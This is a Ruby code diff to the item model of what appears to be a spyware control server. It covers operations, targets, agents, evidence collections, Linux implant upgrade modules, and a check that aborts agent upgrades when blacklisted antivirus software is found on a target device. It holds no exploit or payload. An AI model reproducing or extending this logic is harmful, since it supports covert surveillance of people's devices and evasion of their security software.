@@ -55,6 +55,7 @@ class Item
   scope :targets, where(_kind: 'target')
   scope :agents, where(_kind: 'agent')
   scope :factories, where(_kind: 'factory')
+  scope :path_include, lambda { |item| where('path' => {'$in' =>[item.kind_of?(Item) ? item._id : Moped::BSON::ObjectId.from_string(item.to_s)]}) }
 
   # for the access control
   has_and_belongs_to_many :users, :dependent => :nullify, :autosave => true, inverse_of: nil, index: true
@@ -88,7 +89,7 @@ class Item
   before_create :do_checksum
   before_update :do_checksum
   before_save :do_checksum
-  
+
   public
 
   def self.reset_dashboard
@@ -99,22 +100,10 @@ class Item
     self.stat.dashboard = {}
     self.save
   end
-
-  # performs global recalculation of stats (to be called periodically)
-  def self.restat
-    begin
-      t = Time.now
-      # to make stat converge in one step, first restat agent, targets, then operations
-      #Item.where(_kind: 'agent').each {|i| i.restat}
-      Item.where(_kind: 'target').each {|i| i.restat}
-      Item.where(_kind: 'operation').each {|i| i.restat}
-      trace :debug, "Restat time: #{Time.now - t}" if RCS::DB::Config.instance.global['PERF']
-    rescue Exception => e
-      trace :fatal, "Cannot restat items: #{e.message}"
-    end
-  end
   
   def restat
+    trace :info, "Recalculating stats for #{self._kind} #{self.name}"
+    t = Time.now
     case self._kind
       when 'operation'
         self.stat.size = 0
@@ -162,6 +151,7 @@ class Item
         end
         self.save
     end
+    trace :debug, "Restat for #{self._kind} #{self.name} performed in #{Time.now - t} secs" if RCS::DB::Config.instance.global['PERF']
   end
 
   def move_target(operation)
@@ -372,6 +362,9 @@ class Item
       when 'osx'
         add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
         add_upgrade('driver', File.join(build.tmpdir, 'driver'))
+      when 'linux'
+        add_upgrade('core32', File.join(build.tmpdir, 'core32'))
+        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
       when 'ios'
         add_upgrade('dylib', File.join(build.tmpdir, 'dylib'))
       when 'winmo'
@@ -424,21 +417,26 @@ class Item
     self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})
   end
 
+  # This apply only to "target" items.
+  # If a target entity (related to this target item) does not exists,
+  # creates a new one.
+  def create_target_entity
+    return if _kind != 'target'
+
+    entity_path = path + [_id]
+
+    return if Entity.targets.where(path: entity_path).exists?
+
+    Entity.create!(type: :target, level: :automatic, path: entity_path, name: name, desc: desc)
+  end
+
   def create_callback
-    case self._kind
-      when 'target'
-        self.create_evidence_collections
-        # also create the relative entity
-        Entity.create! do |entity|
-          entity.type = :target
-          entity.level = :automatic
-          entity.path = self.path + [self._id]
-          entity.name = self.name
-          entity.desc = self.desc
-        end
+    if _kind == 'target'
+      create_target_collections
+      create_target_entity
     end
 
-    RCS::DB::PushManager.instance.notify(self._kind, {id: self._id, action: 'create'})
+    RCS::DB::PushManager.instance.notify(_kind, {id: _id, action: 'create'})
   end
 
   def notify_callback
@@ -471,6 +469,7 @@ class Item
         # destroy all the agents of this target
         # to speed up the process, set the DROPPING flag.
         # during callbacks the agent will not delete the evidence
+
         Item.any_in({_kind: ['factory', 'agent']}).in({path: [ self._id ]}).each do |agent|
           agent[:dropping] = true
           agent.save
@@ -480,17 +479,22 @@ class Item
         Entity.any_in({path: [ self._id ]}).each { |entity| entity.destroy }
         trace :info, "Dropping evidence for target #{self.name}"
         # drop evidence and aggregates
-        self.drop_evidence_collections
-        Aggregate.collection_class(self._id.to_s).collection.drop
+        self.drop_target_collections
+
+        # recalculate stats for the operation
+        self.get_parent.restat
       when 'agent'
         # dropping flag is set only by cascading from target
         unless self[:dropping]
           trace :info, "Deleting evidence for agent #{self.name}..."
           Evidence.collection_class(self.path.last).destroy_all(aid: self._id.to_s)
           trace :info, "Deleting aggregates for agent #{self.name}..."
-          Aggregate.collection_class(self.path.last).destroy_all(aid: self._id.to_s)
-          #Aggregate.collection_class(self.path.last).rebuild_summary
+          Aggregate.target(self.path.last).destroy_all(aid: self._id.to_s)
+          trace :info, "Rebuilding summary for target #{self.get_parent.name}..."
+          Aggregate.target(self.path.last).rebuild_summary
           trace :info, "Deleting evidence for agent #{self.name} done."
+          # recalculate stats for the target
+          self.get_parent.restat
         end
       when 'factory'
         # delete all the pushed documents of this factory
@@ -504,24 +508,21 @@ class Item
     raise
   end
 
-  def drop_evidence_collections
+  def drop_target_collections
     return if self._kind != 'target'
 
     # drop the evidence collection of this target
     Evidence.collection_class(self._id.to_s).collection.drop
+    Aggregate.target(self._id.to_s).collection.drop
     RCS::DB::GridFS.drop_collection(self._id.to_s)
   end
 
-  def create_evidence_collections
+  def create_target_collections
     return if self._kind != 'target'
 
-    # create the collection for the target's evidence and shard it
-    db = RCS::DB::DB.instance.mongo_connection
-    collection = db.collection(Evidence.collection_name(self._id))
-    # ensure indexes
-    Evidence.collection_class(self._id).create_indexes
-    # enable sharding only if not enabled
-    RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
+    Evidence.collection_class(self._id).create_collection
+    Aggregate.target(self._id).create_collection
+    RCS::DB::GridFS.create_collection(self._id)
   end
 
   def blacklisted_software?
@@ -533,15 +534,17 @@ class Item
     installed = device[:data]['content']
 
     # check for installed AV
-    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
-      offending.chomp!
-      next unless offending
-      bver, bmatch = offending.split('|')
-      bver = bver.to_i
-      trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
-      if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
-        trace :warn, "Blacklisted software detected: #{bmatch}"
-        raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+    File.open(RCS::DB::Config.instance.file('blacklist'), "r:UTF-8") do |f|
+      while offending = f.gets
+        offending.chomp!
+        next unless offending
+        bver, bmatch = offending.split('|')
+        bver = bver.to_i
+        trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
+        if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
+          trace :warn, "Blacklisted software detected: #{bmatch}"
+          raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+        end
       end
     end
 
@@ -562,15 +565,11 @@ class Item
   def self.offload_destroy(params)
     item = ::Item.find(params[:id])
     item.destroy
-  rescue Exception => e
-    trace :error, "Offload destroy: #{e.message}"
   end
 
   def self.offload_destroy_callback(params)
     item = ::Item.find(params[:id])
     item.destroy_callback
-  rescue Exception => e
-    trace :error, "Offload destroy: #{e.message}"
   end
 
   def status_change_callback
